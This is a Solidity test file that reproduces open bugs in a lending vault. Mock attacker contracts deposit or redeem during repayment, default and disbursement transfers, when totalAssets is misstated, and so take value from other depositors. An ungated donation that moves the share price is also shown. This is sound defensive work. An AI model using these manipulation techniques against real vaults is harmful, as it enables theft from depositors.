// SPDX-License-Identifier: MIT
pragma solidity 0.8.30;

import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";

import {Fixture} from "../helpers/Fixture.sol";
import {MidTransferTrader} from "../mocks/Attackers.sol";
import {CreditManager} from "../../src/CreditManager.sol";

/// @title KnownBugs
/// @notice Defects that are still open against the current `src/`. Every test here passes because it
///         asserts the behaviour that exists today; each one is a repro, not a spec.
/// @dev Identity-linking defects live in ReissuedCredentials.t.sol and IdentityLinking.t.sol.
contract KnownBugsTest is Fixture {
    uint256 internal constant DEPOSIT = 200_000e6;
    uint256 internal constant PRINCIPAL = 5_000e6;
    uint256 internal constant COLLATERAL = 3_138_500_000; // 62.77% of 5_000e6
    uint256 internal constant TERM = 180 days;

    function setUp() public override {
        super.setUp();
        seedPool(DEPOSIT);
    }

    // =================================================================================
    // BUG A (high) -- the share price is still derived from state that is inconsistent during a
    // token transfer, and neither `deposit` nor `redeem` is guarded against being called from inside
    // one.
    //
    // Reordering `repay` moved the inconsistency rather than removing it. `settleRepayment` now runs
    // BEFORE the money arrives, so for the duration of the transfer `totalAssets` is *understated*
    // by the principal. A Cleanverse Verified Asset hands control to its policy contract before it
    // moves balances, which is precisely that window — and depositing into an understated vault
    // mints shares too cheaply, at the expense of everyone already in it.
    // =================================================================================

    function test_BUG_Repay_TotalAssetsIsUnderstatedUntilTheMoneyArrives() public {
        MidTransferTrader observer = new MidTransferTrader(pool, IERC20(address(asset)));
        onboard(address(observer), 50, 0, keccak256("kyc:observer"), 500_000e6);

        vm.prank(alice);
        uint256 loanId = manager.open(PRINCIPAL, TERM);
        uint256 interest = manager.loan(loanId).interestDue;
        assertGt(interest, 0);

        uint256 assetsBefore = pool.totalAssets();

        // Observe from the position the verified asset actually yields control in: before balances
        // move, when it consults the policy engine.
        asset.setPreObserver(address(observer));
        observer.arm(MidTransferTrader.Action.None, address(pool));
        vm.warp(START_TS + TERM);
        vm.prank(alice);
        manager.repay(loanId);
        asset.setPreObserver(address(0));

        assertTrue(observer.fired(), "the observer ran inside the repayment");
        assertEq(
            observer.totalAssetsSeen(),
            assetsBefore - PRINCIPAL,
            "totalAssets is short by the whole principal mid-repayment"
        );
        assertLt(observer.sharePriceSeen(), sharePrice(), "at a price well below the settled one");
    }

    function test_BUG_Repay_MidRepaymentDepositMintsSharesTooCheaply() public {
        MidTransferTrader attacker = new MidTransferTrader(pool, IERC20(address(asset)));
        onboard(address(attacker), 50, 0, keccak256("kyc:attacker"), 500_000e6);

        vm.prank(alice);
        uint256 loanId = manager.open(PRINCIPAL, TERM);
        uint256 interest = manager.loan(loanId).interestDue;

        uint256 stake = 100_000e6;

        // What the attacker's deposit would be worth if it were made honestly, after settlement.
        uint256 fairFinalAssets = DEPOSIT + interest + stake;

        attacker.setDepositAmount(stake);
        asset.setPreObserver(address(attacker));
        attacker.arm(MidTransferTrader.Action.Deposit, address(pool));
        vm.warp(START_TS + TERM);
        vm.prank(alice);
        manager.repay(loanId);
        asset.setPreObserver(address(0));

        assertTrue(attacker.fired(), "deposited inside the repayment");
        assertEq(pool.totalAssets(), fairFinalAssets, "the pool ends up with the right total");

        uint256 attackerClaim = pool.previewRedeem(pool.balanceOf(address(attacker)));
        uint256 lpClaim = pool.previewRedeem(pool.balanceOf(lp));

        assertGt(attackerClaim, stake, "the attacker is instantly in profit on a fresh deposit");
        assertLt(lpClaim, DEPOSIT + interest, "and the honest LP is short by the same money");
        assertApproxEqAbs(
            attackerClaim - stake,
            (DEPOSIT + interest) - lpClaim,
            2,
            "one for one, straight out of the existing depositor"
        );
        // Concretely: ~1_889 aUSDC lifted out of a 200_000 aUSDC position by a 100_000 aUSDC deposit
        // held for the length of one transfer.
        assertGt(attackerClaim - stake, 1_000e6, "material, not dust");
    }

    /// @dev The reordering was applied to `repay` only. `markDefault` still transfers the seized
    ///      collateral to the pool BEFORE retiring the principal, so `totalAssets` is *overstated*
    ///      by the full principal at the post-transfer position — the exact defect that was fixed
    ///      one function above, still live here.
    function test_BUG_MarkDefault_TotalAssetsIsOverstatedWhileCollateralIsSeized() public {
        MidTransferTrader observer = new MidTransferTrader(pool, IERC20(address(asset)));
        onboard(address(observer), 50, 0, keccak256("kyc:observer2"), 500_000e6);
        vm.prank(address(observer));
        observer.lend(DEPOSIT);

        vm.prank(alice);
        uint256 loanId = manager.open(PRINCIPAL, 30 days);
        vm.warp(START_TS + 30 days + manager.GRACE_PERIOD());

        asset.setObserver(address(observer));
        observer.arm(MidTransferTrader.Action.None, address(pool));
        manager.markDefault(loanId);
        asset.setObserver(address(0));

        assertTrue(observer.fired(), "observed inside the seizure");
        assertEq(
            observer.totalAssetsSeen(),
            pool.totalAssets() + PRINCIPAL,
            "the written-off principal is still counted as an asset"
        );
    }

    function test_BUG_MarkDefault_MidSeizureRedemptionStealsFromTheOtherLps() public {
        MidTransferTrader attacker = new MidTransferTrader(pool, IERC20(address(asset)));
        onboard(address(attacker), 50, 0, keccak256("kyc:attacker2"), 500_000e6);
        vm.prank(address(attacker));
        attacker.lend(DEPOSIT);

        vm.prank(alice);
        uint256 loanId = manager.open(PRINCIPAL, 30 days);
        vm.warp(START_TS + 30 days + manager.GRACE_PERIOD());

        // Both LPs are equal, so an honest outcome is an equal split of what is left.
        uint256 fairClaim = (2 * DEPOSIT - (PRINCIPAL - COLLATERAL)) / 2;

        asset.setObserver(address(attacker));
        attacker.arm(MidTransferTrader.Action.Redeem, address(pool));
        manager.markDefault(loanId);
        asset.setObserver(address(0));

        assertTrue(attacker.fired(), "redeemed inside the write-off");
        assertGt(attacker.assetsRedeemed(), fairClaim, "took more than its share");
        assertLt(pool.previewRedeem(pool.balanceOf(lp)), fairClaim, "the honest LP absorbs it");
        assertApproxEqAbs(
            attacker.assetsRedeemed() - fairClaim,
            fairClaim - pool.previewRedeem(pool.balanceOf(lp)),
            2,
            "one for one"
        );
    }

    /// @dev The same window exists on disbursement: `fundLoan` books the principal as outstanding
    ///      before the tokens leave, so at the pre-transfer position the pool counts the money twice.
    function test_BUG_FundLoan_TotalAssetsIsOverstatedWhileTheLoanIsPaidOut() public {
        MidTransferTrader observer = new MidTransferTrader(pool, IERC20(address(asset)));
        onboard(address(observer), 50, 0, keccak256("kyc:observer3"), 500_000e6);

        uint256 assetsBefore = pool.totalAssets();

        asset.setPreObserver(address(observer));
        observer.arm(MidTransferTrader.Action.None, alice);
        vm.prank(alice);
        manager.open(PRINCIPAL, TERM);
        asset.setPreObserver(address(0));

        assertTrue(observer.fired(), "observed inside the disbursement");
        assertEq(
            observer.totalAssetsSeen(),
            assetsBefore + PRINCIPAL,
            "principal counted as both cash and loan"
        );
    }

    // =================================================================================
    // BUG C (medium, acknowledged) -- `totalAssets()` reads `balanceOf`, so a plain transfer into the
    // pool moves the share price. The virtual offset bounds the griefing but does not remove the
    // channel: value can still be pushed into a compliance-gated vault without passing the gate.
    // =================================================================================

    function test_BUG_Pool_SharePriceIsStillMovedByAnUngatedDonation() public {
        uint256 priceBefore = sharePrice();

        // A credentialed party can do this, and so can an uncredentialed one -- the asset transfer
        // never touches the pool's gate either way.
        vm.prank(lp2);
        asset.transfer(address(pool), 50_000e6);
        assertGt(sharePrice(), priceBefore, "share price moved without a deposit");

        uint256 priceMid = sharePrice();
        vm.prank(stranger);
        asset.transfer(address(pool), 50_000e6);
        assertGt(sharePrice(), priceMid, "including by a party the gate refuses outright");

        assertEq(pool.totalAssets(), DEPOSIT + 100_000e6, "all counted as vault assets");
    }

    /// @dev The donated value is not recoverable by the donor and lands on existing depositors, so
    ///      the practical consequence is a mis-priced entry for the next depositor rather than theft.
    function test_BUG_Pool_DonationIsCreditedToExistingDepositorsNotTheDonor() public {
        uint256 lpSharesBefore = pool.balanceOf(lp);

        vm.prank(lp2);
        asset.transfer(address(pool), 50_000e6);

        assertEq(pool.balanceOf(lp2), 0, "the donor gets nothing");
        assertEq(pool.balanceOf(lp), lpSharesBefore, "and the incumbent's shares are simply worth more");
        assertApproxEqAbs(pool.previewRedeem(lpSharesBefore), DEPOSIT + 50_000e6, 1, "windfall");
    }
}
